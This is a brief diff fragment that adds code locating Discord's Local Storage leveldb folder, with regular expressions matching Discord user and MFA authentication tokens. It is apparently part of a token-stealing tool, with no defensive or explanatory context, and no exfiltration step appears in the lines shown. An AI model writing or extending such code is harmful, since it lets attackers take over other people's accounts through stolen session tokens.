@@ -1,0 +1,4 @@
+regex = r"mfa\.[\w-]{84}"
+regex2 = r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"
+path = appdata + "\\discord\\Local Storage\\leveldb"
+
